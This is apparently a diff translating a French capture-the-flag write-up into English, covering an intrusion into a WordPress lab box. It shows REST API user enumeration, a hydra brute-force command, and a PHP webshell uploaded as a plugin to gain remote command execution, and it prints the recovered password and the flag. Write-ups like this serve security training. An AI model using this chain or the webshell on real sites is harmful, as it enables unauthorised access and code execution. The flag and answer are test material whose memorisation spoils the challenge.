@@ -1,83 +1,83 @@
 # Write-up : "The Very Best"
 
-**Cible :** 10.10.0.X (vhost `viridiancity.epi`, l'IP change à chaque redéploiement)
+**Target:** 10.10.0.X (vhost `viridiancity.epi`, the IP changes on every redeploy)
 
-**Objectif :** Obtenir user.txt
+**Objective:** Get user.txt
 
-**Difficulté :** Medium
+**Difficulty:** Medium
 
-**Date :** 18/09/2026
+**Date:** 18/09/2026
 
-**Techniques utilisées :** Reconnaissance web, énumération d'utilisateurs WordPress (API REST), OSINT sur le contenu du site, brute force ciblé, RCE via upload de plugin WordPress
+**Techniques used:** Web reconnaissance, WordPress user enumeration (REST API), OSINT on the site's content, targeted brute force, RCE via WordPress plugin upload
 
-**Outils utilisés :** nmap, curl, jq, hydra, python3, zip
+**Tools used:** nmap, curl, jq, hydra, python3, zip
 
 ---
 
-## 1. Reconnaissance réseau (Nmap)
+## 1. Network reconnaissance (Nmap)
 
 ```bash
 nmap -sV 10.10.0.X
 ```
-**Résultat :**
-- `22/tcp` : SSH (OpenSSH)
-- `80/tcp` : HTTP (Apache 2.4.68), un WordPress 7.0
+**Result:**
+- `22/tcp`: SSH (OpenSSH)
+- `80/tcp`: HTTP (Apache 2.4.68), a WordPress 7.0
 
-Le site utilise le nom d'hôte `viridiancity.epi`, on l'ajoute dans `/etc/hosts` (sinon les liens internes et l'API ne répondent pas correctement) :
+The site uses the hostname `viridiancity.epi`, we add it to `/etc/hosts` (otherwise internal links and the API don't respond correctly):
 
 ```bash
 echo "10.10.0.X viridiancity.epi" | sudo tee -a /etc/hosts
 ```
 
-**Faille (config) :** virtual host obligatoire. Sans le bon en-tête `Host`, on tombe sur le site par défaut.
+**Vulnerability (config):** mandatory virtual host. Without the correct `Host` header, we land on the default site.
 
 ---
 
-## 2. Énumération des utilisateurs WordPress (API REST)
+## 2. WordPress user enumeration (REST API)
 
 ```bash
 curl -s http://viridiancity.epi/index.php/wp-json/wp/v2/users
 ```
-**Résultat :** un seul compte, `ash` (le slug est le login).
+**Result:** a single account, `ash` (the slug is the login).
 
-**Faille exploitée :** fuite d'informations via l'API REST WordPress (CWE-200). L'endpoint `wp-json/wp/v2/users` expose les auteurs sans authentification.
+**Vulnerability exploited:** information leak via the WordPress REST API (CWE-200). The `wp-json/wp/v2/users` endpoint exposes authors without authentication.
 
 ---
 
-## 3. Indice sur le mot de passe (OSINT du contenu)
+## 3. Hint about the password (content OSINT)
 
-En lisant la page "About Viridian", on trouve la convention de mot de passe de la ville :
+While reading the "About Viridian" page, we find the city's password convention:
 
 > "the password is the Pokémon's species name written entirely in lowercase, followed immediately by two digits."
 
-Donc le mot de passe = un nom de pokémon en minuscules suivi de 2 chiffres.
-Viridian City est en région Kanto, le pokémon est donc un des 151 de la Gen 1.
+So the password = a Pokémon name in lowercase followed by 2 digits.
+Viridian City is in the Kanto region, so the Pokémon is one of the 151 from Gen 1.
 
-**Faille exploitée :** politique de mots de passe faible et prévisible (CWE-521).
+**Vulnerability exploited:** weak and predictable password policy (CWE-521).
 
 ---
 
-## 4. Brute force ciblé du login `ash`
+## 4. Targeted brute force of the `ash` login
 
-On génère la liste `nom_pokémon + 00 à 99` (151 x 100 = 15 100 essais), puis :
+We generate the list `pokemon_name + 00 to 99` (151 x 100 = 15,100 attempts), then:
 
 ```bash
 hydra -l ash -P poke.txt -t 4 viridiancity.epi http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=login_error'
 ```
-- `-t 4` = peu de threads : une box fragile crashe sa base si on la martèle (et renvoie alors des faux positifs).
-- `F=login_error` = un échec contient `login_error` dans la réponse.
+- `-t 4` = few threads: a fragile box crashes its database if hammered (and then returns false positives).
+- `F=login_error` = a failure contains `login_error` in the response.
 
-**Résultat :** `ash : kakuna67`
+**Result:** `ash : kakuna67`
 
-Détection fiable : un vrai succès renvoie une redirection 302 vers `/wp-admin`, pas seulement l'absence de `login_error`.
+Reliable detection: a real success returns a 302 redirect to `/wp-admin`, not just the absence of `login_error`.
 
 ---
 
-## 5. De l'accès admin à la RCE (upload de plugin)
+## 5. From admin access to RCE (plugin upload)
 
-L'éditeur de thème (`theme-editor.php`) est bloqué par la sécurité "loopback" de WordPress : après édition, WP tente de se contacter lui-même pour vérifier l'absence d'erreur fatale ; sur une box isolée ce test échoue et la modif est annulée.
+The theme editor (`theme-editor.php`) is blocked by WordPress's "loopback" security check: after editing, WP tries to contact itself to check for a fatal error; on an isolated box this test fails and the edit is reverted.
 
-On contourne via l'upload d'un plugin contenant un webshell (les fichiers du zip sont extraits dans `wp-content/plugins/` sans même l'activer) :
+We work around this via uploading a plugin containing a webshell (the zip's files are extracted into `wp-content/plugins/` without even activating it):
 
 ```php
 <?php
@@ -85,11 +85,11 @@ On contourne via l'upload d'un plugin contenant un webshell (les fichiers du zip
 if(isset($_GET['c'])){ system($_GET['c']); }
 ```
 
-On zippe (`shellx/shellx.php`) et on l'envoie via Extensions puis Ajouter puis Téléverser (ou en POST sur `update.php?action=upload-plugin` avec le nonce).
+We zip it (`shellx/shellx.php`) and send it via Plugins then Add New then Upload (or via a POST on `update.php?action=upload-plugin` with the nonce).
 
-**Faille exploitée :** upload de plugin arbitraire menant à l'exécution de code (CWE-434, RCE).
+**Vulnerability exploited:** arbitrary plugin upload leading to code execution (CWE-434, RCE).
 
-Vérification :
+Verification:
 
 ```bash
 curl "http://viridiancity.epi/wp-content/plugins/shellx/shellx.php?c=id"
@@ -98,13 +98,13 @@ curl "http://viridiancity.epi/wp-content/plugins/shellx/shellx.php?c=id"
 
 ---
 
-## 6. Récupération du flag
+## 6. Retrieving the flag
 
 ```bash
 curl "http://viridiancity.epi/wp-content/plugins/shellx/shellx.php?c=cat+/home/ash/user.txt"
 ```
 
-**FLAG obtenu :**
+**FLAG obtained:**
 
 ```
 EPI{4sH_1s_M4yB3_Th3_V3ry_B3st}
@@ -112,32 +112,32 @@ EPI{4sH_1s_M4yB3_Th3_V3ry_B3st}
 
 ---
 
-## Résumé des failles exploitées
+## Summary of exploited vulnerabilities
 
-| # | Faille | Catégorie (CWE) |
+| # | Vulnerability | Category (CWE) |
 | --- | --- | --- |
-| 1 | Énumération d'utilisateurs via l'API REST WordPress | CWE-200 |
-| 2 | Convention de mot de passe faible/prévisible | CWE-521 |
-| 3 | Absence d'anti-brute-force sur `wp-login.php` | CWE-307 |
-| 4 | Upload de plugin arbitraire (RCE) | CWE-434 / CWE-94 |
+| 1 | User enumeration via the WordPress REST API | CWE-200 |
+| 2 | Weak/predictable password convention | CWE-521 |
+| 3 | No anti-brute-force on `wp-login.php` | CWE-307 |
+| 4 | Arbitrary plugin upload (RCE) | CWE-434 / CWE-94 |
 
 ---
 
-## Résumé des étapes
+## Summary of steps
 
-1. `wp-json/wp/v2/users` : login `ash`.
-2. Page "About Viridian" : convention pokémon + 2 chiffres (Kanto = Gen 1).
-3. Brute force ciblé (hydra, 15100 combos) : `ash:kakuna67`.
-4. wp-admin, éditeur de thème bloqué (loopback), upload d'un plugin webshell.
-5. Paramètre `?c=`, RCE en www-data, `cat /home/ash/user.txt`, le flag.
+1. `wp-json/wp/v2/users`: login `ash`.
+2. "About Viridian" page: Pokémon convention + 2 digits (Kanto = Gen 1).
+3. Targeted brute force (hydra, 15100 combos): `ash:kakuna67`.
+4. wp-admin, theme editor blocked (loopback), upload a webshell plugin.
+5. `?c=` parameter, RCE as www-data, `cat /home/ash/user.txt`, the flag.
 
 ---
 
 ## Conclusion
 
-- **Accès initial :** énumération API (`ash`) et indice OSINT de la page About (convention de mot de passe Pokémon).
-- **Accès admin :** brute force ciblé et throttlé, `ash:kakuna67`.
-- **RCE :** contournement du blocage de l'éditeur de thème via upload d'un plugin webshell.
-- **Flag user :** `EPI{4sH_1s_M4yB3_Th3_V3ry_B3st}`
+- **Initial access:** API enumeration (`ash`) and an OSINT hint from the About page (Pokémon password convention).
+- **Admin access:** targeted and throttled brute force, `ash:kakuna67`.
+- **RCE:** bypassing the theme editor block via uploading a webshell plugin.
+- **User flag:** `EPI{4sH_1s_M4yB3_Th3_V3ry_B3st}`
 
-Leçons : lire le contenu du site (l'indice mot de passe y était), cibler le brute force (convention et thème Kanto), ne pas marteler une box fragile (faux positifs quand la DB crashe), et détecter le succès sur la redirection 302 plutôt que sur l'absence de `login_error`.
+Lessons: read the site's content (the password hint was there), target the brute force (convention and Kanto theme), don't hammer a fragile box (false positives when the DB crashes), and detect success from the 302 redirect rather than the absence of `login_error`.
